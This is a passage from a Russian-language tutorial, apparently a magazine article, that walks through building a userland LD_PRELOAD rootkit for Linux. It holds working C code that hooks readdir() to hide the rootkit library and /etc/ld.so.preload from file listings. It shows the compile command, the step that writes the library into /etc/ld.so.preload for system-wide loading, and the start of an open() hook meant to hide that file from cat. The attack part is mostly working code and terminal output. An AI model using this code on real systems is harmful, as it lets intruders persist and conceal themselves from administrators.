<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">!strncmp(ep-&gt;d_name, LD_PL, strlen(LD_PL))</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">)) {</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">ep = orig_readdir(dirp);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">}</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">return ep;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">}</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p40"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">К</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ом­пилиру­ем и про­веря­ем работу:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">$ gcc -Wall -fPIC -shared -o rootkit.so rkit.c -ldl</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">$ ls -lah</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">ито­го 28K</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">drwxr-xr-x 2 n0a n0a 4,0K ноя 23 23:46 .</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">drwxr-xr-x 4 n0a n0a 4,0K ноя 23 23:33 ..</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">-rw-r--r-- 1 n0a n0a 496 ноя 23 23:44 rkit.c</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">-rwxr-xr-x 1 n0a n0a 16K ноя 23 23:46 rootkit.so</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">$ LD_PRELOAD=./rootkit.so ls -lah</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">ито­го 12K</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">drwxr-xr-x 2 n0a n0a 4,0K ноя 23 23:46 .</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">drwxr-xr-x 4 n0a n0a 4,0K ноя 23 23:33 ..</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">-rw-r--r-- 1 n0a n0a 496 ноя 23 23:44 rkit.c</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p43"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Н</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ам уда­лось скрыть файл </span><a name="code83"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">r</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ootkit.so от пос­торон­них глаз. Пока мы тес­тирова­ли биб­лиоте­ку исклю­читель­но в пре­делах одной коман­ды.</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="toc03.1"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> </span></p>
<h3 style=" margin-top:14px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">Используем /etc/ld.so.preload</span></h3>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p44"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Д</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">а­вай вос­поль­зуем­ся записью в </span><a name="code84"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">/</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">etc/ld.so.preload для сок­рытия нашего фай­ла от всех поль­зовате­лей сис­темы. Для это­го запишем в </span><a name="code85"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">d.so.preload путь до нашей биб­лиоте­ки:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;"># ls</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">rkit.c rootkit.so</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;"># echo $(pwd)/rootkit.so &gt; /etc/ld.so.preload</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;"># ls</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">rkit.c</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p47"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Т</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">е­перь мы скры­ли файл ото всех поль­зовате­лей (хотя это не сов­сем так, но об этом поз­же). Но опыт­ный адми­нис­тра­тор доволь­но лег­ко нас обна­ружит, так как само по себе наличие фай­ла </span><a name="code89"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">/</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">etc/ld.so.preload может говорить о при­сутс­твии рут­кита — осо­бен­но если рань­ше такого фай­ла не было.</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="toc04."></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> </span></p>
<h2 style=" margin-top:16px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">Скрываем ld.so.preload</span></h2>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p48"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Д</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">а­вай попыта­емся скрыть из лис­тинга и сам файл </span><a name="code90"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">d.so.preload. Нем­ного модифи­циру­ем код </span><a name="code91"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">r</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">kit.c:</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#define _GNU_SOURCE</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;dlfcn.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;dirent.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;stdlib.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;stdio.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include &lt;string.h&gt;</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#define RKIT &quot;rootkit.so&quot;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#define LD_PL &quot;ld.so.preload&quot;</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">struct dirent* (*orig_readdir)(DIR *) = NULL;</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">struct dirent *readdir(DIR *dirp)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">{</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  if (orig_readdir == NULL)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">    orig_readdir = (struct dirent*(*)(DIR *))dlsym(RTLD_NEXT, &quot;readdir&quot;);</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  struct dirent *ep = orig_readdir( dirp );</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">while ( ep != NULL &amp;&amp;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">( !strncmp(ep-&gt;d_name, RKIT, strlen(RKIT)) ||</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">!strncmp(ep-&gt;d_name, LD_PL, strlen(LD_PL))</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">)) {</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">ep = orig_readdir(dirp);</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">}</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">return ep;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">}</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p49"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Д</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ля наг­ляднос­ти я добавил к пре­дыду­щей прог­рамме еще один мак­рос </span><a name="code93"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">L</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">D_PL c име­нем фай­ла </span><a name="code94"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">d.so.preload, который мы так­же добави­ли в цикл </span><a name="code95"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">w</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">hile, где срав­нива­ем имя фай­ла для скры­тия.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p50"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">П</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ос­ле ком­пиляции исходный файл </span><a name="code96"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">r</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ootkit.so будет переза­писан и из вывода ути­литы </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">ls</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> про­падет и нуж­ный файл </span><a name="code97"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">d.so.preload. Про­веря­ем:</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="panel11"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> gcc -Wall -fPIC -shared -o rootkit.so rkit.c -ldl</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code99"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> ls</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">rkit.c</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p52"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> ls /etc/</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">...</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">ldap tmpfiles.d</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">ld.so.cache ucf.conf</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">ld.so.conf udev</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">ld.so.conf.d udisks2</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">libao.conf ufw</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">libaudit.conf update-motd.d</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">libblockdev UPower</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">...</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p53"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">З</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">до­рово! Мы толь­ко что ста­ли на один шаг бли­же к пол­ной кон­спи­рации. Вро­де бы это победа, но не спе­ши радовать­ся.</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="toc05."></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> </span></p>
<h2 style=" margin-top:16px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">Погружаемся глубже</span></h2>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p54"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Д</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">а­вай про­верим, смо­жем ли мы про­читать файл </span><a name="code101"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">d.so.preload коман­дой </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">cat</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">:</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="panel12"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> cat /etc/ld.so.preload</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">/root/rootkit/src/rootkit.so</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p56"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Т</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ак‑так‑так. Получа­ется, мы пло­хо спря­тались, если наличие нашего фай­ла мож­но про­верить прос­тым чте­нием. Почему так выш­ло?</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p57"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">О</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">че­вид­но, что для получе­ния содер­жимого ути­лита </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">cat</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> вызыва­ет дру­гую фун­кцию — не </span><a name="code103"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">r</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">eaddir(), которую мы так ста­ратель­но перепи­сыва­ли. Что ж, давай пос­мотрим, что исполь­зует cat:</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="panel13"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> ltrace cat /etc/ld.so.preload</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">...</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">__fxstat(1, 1, 0x7ffded9f6180) = 0</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">getpagesize() = 4096</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">open(&quot;/etc/ld.so.preload&quot;, 0, 01) = 3</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">__fxstat(1, 3, 0x7ffded9f6180) = 0</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">posix_fadvise(3, 0, 0, 2) = 0</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">...</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p59"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Н</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">а этот раз нам нуж­но порабо­тать с фун­кци­ей </span><a name="code105"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">o</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">pen(). Пос­коль­ку мы уже опыт­ные, давай добавим в наш рут­кит фун­кцию, которая при обра­щении к фай­лу </span><a name="code106"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">/</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">etc/ld.so.preload будет веж­ливо говорить, что фай­ла не сущес­тву­ет (Error no entry или прос­то </span><a name="code107"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">E</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">NOENT).</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p60"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">С</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">но­ва модифи­циру­ем </span><a name="code108"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">r</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">kit.c:</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">#define _GNU_SOURCE</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">#include &lt;dlfcn.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">#include &lt;dirent.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">#include &lt;stdlib.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">#include &lt;stdio.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">#include &lt;string.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">#include &lt;errno.h&gt;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">// Добавляем путь, который использует open()</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">// для открытия файла /etc/ld.so.preload</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">#define LD_PATH &quot;/etc/ld.so.preload&quot;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">#define RKIT &quot;rootkit.so&quot;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">#define LD_PL &quot;ld.so.preload&quot;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">struct dirent* (*orig_readdir)(DIR *) = NULL;</span></p>
